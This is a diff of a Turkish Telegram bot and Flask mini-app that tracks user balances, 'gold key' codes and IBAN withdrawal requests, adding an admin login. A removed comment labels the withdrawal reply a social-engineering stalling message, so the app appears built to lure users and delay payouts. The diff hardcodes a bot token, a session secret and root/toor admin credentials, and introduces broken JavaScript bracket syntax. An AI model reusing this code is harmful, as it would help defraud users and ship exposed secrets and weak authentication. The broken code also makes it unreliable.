@@ -3,7 +3,7 @@ import logging
 import random
 import string
 import requests
-from flask import Flask, render_template_string, request, jsonify
+from flask import Flask, render_template_string, request, jsonify, session, redirect, url_for
 from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, WebAppInfo
 from telegram.ext import Application, CommandHandler, CallbackQueryHandler
 
@@ -18,13 +18,15 @@ TOKEN = os.environ.get("TELEGRAM_TOKEN", "9101317558:AAEUpeDk9jCVgFrMm75UqKlUBeP
 WEBAPP_URL = os.environ.get("WEBAPP_URL", "https://botgoldkey.onrender.com")
 
 # Veri tabanı simülasyonu
-users_db = {}  # {user_id: {"balance": 0.0, "has_gold_key": False, "ref_token": None, "withdraw_status": None}}
-keys_db = {}   # {key_string: {"owner_id": id, "uses": 0, "max_uses": 10, "active": True}}
-withdraw_db = [] # Çekim talepleri
+users_db = {}  
+keys_db = {}   
+withdraw_db = [] 
 
 app = Flask(__name__)
+app.secret_key = "gizli_admin_session_anahtari_kanka" # Session güvenliği için
 
 # --- HTML ŞABLONLARI ---
+
 MINI_APP_HTML = """
 <!DOCTYPE html>
 <html lang="tr">
@@ -81,7 +83,7 @@ MINI_APP_HTML = """
         }
 
         function useKey() {
-            const key = document.getElementById('keyInput').value.trim();
+            const key = document.getElementById('keyInput'].value.trim();
             const msg = document.getElementById('resultMsg');
             if(!key) { msg.innerText = "Lütfen bir kod girin!"; msg.className = "error"; return; }
             fetch('/api/use-key', {
@@ -91,12 +93,12 @@ MINI_APP_HTML = """
             }).then(res => res.json()).then(data => {
                 msg.innerText = data.message;
                 msg.className = data.success ? "success" : "error";
-                if(data.success) { loadData(); document.getElementById('keyInput').value = ""; }
+                if(data.success) { loadData(); document.getElementById('keyInput'].value = ""; }
             });
         }
 
         function requestWithdraw() {
-            const iban = document.getElementById('ibanInput').value.trim();
+            const iban = document.getElementById('ibanInput'].value.trim();
             const msg = document.getElementById('withdrawMsg');
             if(!iban) { msg.innerText = "Lütfen IBAN veya Papara numarası girin!"; msg.className = "error"; return; }
 
@@ -116,6 +118,34 @@ MINI_APP_HTML = """
 </html>
 """
 
+LOGIN_HTML = """
+<!DOCTYPE html>
+<html lang="tr">
+<head>
+    <meta charset="UTF-8">
+    <title>Admin Girişi</title>
+    <style>
+        body { font-family: Arial, sans-serif; background: #0f172a; color: white; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .login-card { background: #1e293b; padding: 30px; border-radius: 12px; box-shadow: 0 4px 10px rgba(0,0,0,0.5); width: 300px; text-align: center; }
+        input { width: 90%; padding: 12px; margin: 10px 0; border-radius: 6px; border: none; background: #334155; color: white; }
+        button { width: 100%; padding: 12px; background: #3b82f6; color: white; border: none; border-radius: 6px; font-weight: bold; cursor: pointer; margin-top: 10px; }
+        .error { color: #ef4444; font-size: 14px; margin-top: 10px; }
+    </style>
+</head>
+<body>
+    <div class="login-card">
+        <h2>🔒 Admin Girişi</h2>
+        <form method="POST">
+            <input type="text" name="username" placeholder="Kullanıcı Adı" required>
+            <input type="password" name="password" placeholder="Şifre" required>
+            <button type="submit">Giriş Yap</button>
+        </form>
+        {% if error %}<p class="error">{{ error }}</p>{% endif %}
+    </div>
+</body>
+</html>
+"""
+
 ADMIN_HTML = """
 <!DOCTYPE html>
 <html lang="tr">
@@ -128,11 +158,12 @@ ADMIN_HTML = """
         th, td { padding: 12px; border-bottom: 1px solid #e2e8f0; text-align: left; }
         th { background: #0f172a; color: white; }
         h1, h2 { color: #0f172a; }
-        .btn { padding: 6px 12px; background: #ef4444; color: white; border: none; border-radius: 4px; cursor: pointer; }
+        .logout { float: right; background: #ef4444; color: white; padding: 8px 16px; border-radius: 6px; text-decoration: none; font-weight: bold; }
     </style>
 </head>
 <body>
-    <h1>🛠️ Gelişmiş Bot Yönetim Paneli</h1>
+    <a href="/admin-logout" class="logout">Çıkış Yap</a>
+    <h1>🛠️ Güvenli Admin Paneli</h1>
     
     <h2>Para Çekme Talepleri (Bekleyenler)</h2>
     <table>
@@ -168,13 +199,34 @@ ADMIN_HTML = """
 """
 
 # --- FLASK ROTALARI ---
+
 @app.route('/')
 def mini_app():
     return render_template_string(MINI_APP_HTML)
 
+@app.route('/admin-login', methods=['GET', 'POST'])
+def admin_login():
+    error = None
+    if request.method == 'POST':
+        username = request.form.get('username')
+        password = request.form.get('password')
+        if username == "root" and password == "toor":
+            session['admin_logged_in'] = True
+            return redirect(url_for('admin_panel'))
+        else:
+            error = "Hatalı kullanıcı adı veya şifre!"
+    return render_template_string(LOGIN_HTML, error=error)
+
 @app.route('/admin-panel')
 def admin_panel():
+    if not session.get('admin_logged_in'):
+        return redirect(url_for('admin_login'))
     return render_template_string(ADMIN_HTML, users=users_db, keys=keys_db, withdraws=withdraw_db)
+
+@app.route('/admin-logout')
+def admin_logout():
+    session.pop('admin_logged_in', None)
+    return redirect(url_for('admin_login'))
 
 @app.route('/api/user/<int:user_id>')
 def get_user_data(user_id):
@@ -221,9 +273,8 @@ def withdraw():
     if user["balance"] < 250.0:
         return jsonify({"success": False, "message": "Para çekmek için minimum bakiye 250 TL olmalıdır!"})
 
-    # Sosyal Mühendislik / Geciktirme Mesajı
     withdraw_db.append({"user_id": user_id, "amount": user["balance"], "iban": iban})
-    user["balance"] = 0.0 # Bakiyeyi sıfırlayıp talebe alıyoruz
+    user["balance"] = 0.0 
     
     return jsonify({
         "success": True, 
@@ -297,7 +348,7 @@ if __name__ == '__main__':
     webhook_url = f"{WEBAPP_URL}/{TOKEN}"
     try:
         requests.get(f"https://api.telegram.org/bot{TOKEN}/setWebhook?url={webhook_url}")
-        logger.info(f"Webhook başarıyla tanımlandı: {webhook_url}")
+        logger.info(f"Webhook başarıyla tanımlendi: {webhook_url}")
     except Exception as e:
         logger.error(f"Webhook ayarlanamadı: {e}")
 
